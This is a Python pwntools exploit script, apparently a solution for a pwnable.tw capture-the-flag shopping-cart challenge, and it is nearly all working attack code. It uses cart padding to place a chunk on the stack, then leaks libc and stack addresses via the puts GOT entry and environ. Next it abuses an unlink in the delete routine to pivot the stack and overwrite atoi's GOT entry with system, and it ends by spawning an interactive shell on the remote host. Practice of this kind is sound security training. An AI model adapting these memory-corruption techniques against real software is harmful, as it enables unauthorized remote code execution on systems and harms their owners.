from pwn import *

###Utils
def create(choice):
    r.sendlineafter('> ','2')
    r.sendlineafter('> ',str(choice))

def check():
    r.sendlineafter('> ','5')
    r.sendlineafter('> ','y')

def expcart(data,itm):
    r.sendlineafter('> ','4')
    r.sendafter('> ',b'y '+data)
    res = b''
    for i in range(itm+1):
        res+=r.recvline()
    return res

def expdelete(idx,data):
    r.sendlineafter('> ','3')
    r.sendlineafter('> ',str(idx).encode('utf-8')+data)

###Useful addr
environ_offset = 0x1b1dbc
system_offset = 0x3a940
puts_offset = 0x5f140
puts_got = 0x804b028
atoi_got = 0x804b040

###Exploit
r = remote('chall.pwnable.tw',10104)

###Pad to target price + get chunk on stack
#  7174 = 199*6+299*20
for i in range(6):
    create(1)
for i in range(20):
    create(2)
check()

###Leak libc_base
payload = p32(puts_got)+p32(1)+p32(0)+p32(0)
puts_addr = u32(expcart(payload,27).strip().split(b'\n')[-1].split(b': ')[1].split(b' - ')[0][:4])
libc_base = puts_addr-puts_offset

###Leak stack
payload = p32(environ_offset+libc_base)+p32(1)+p32(0)+p32(0)
stack_addr = u32(expcart(payload,27).strip().split(b'\n')[-1].split(b': ')[1].split(b' - ')[0][:4])
subfunc_ebp = stack_addr-0x104

###Hijack atoi got
#  chunk[0] must be valid ptr which terminates atoi_arg, atoi_got satisfies this
#  unlink causes chunk[2]+0xc=chunk[3],chunk[3]+0x8=chunk[2]
#  the payload makes ebp=atoi+0x22-0x4,which migrates the stack on return
#  handler buf=ebp-0x22  ->  can overwrite atoi_got with four bytes pad
#  atoi(&buf) is called -> four bytes padding = argument
payload = p32(atoi_got)+p32(1)+p32(subfunc_ebp-0xc)+p32(atoi_got+0x22-0x4)
expdelete(27,payload)
payload = b'sh\x00\x00'+p32(system_offset+libc_base)
r.send(payload)

###get shell
r.interactive()



###Reference
#  libc_environ
#    http://tacxingxing.com/2017/12/16/environ/
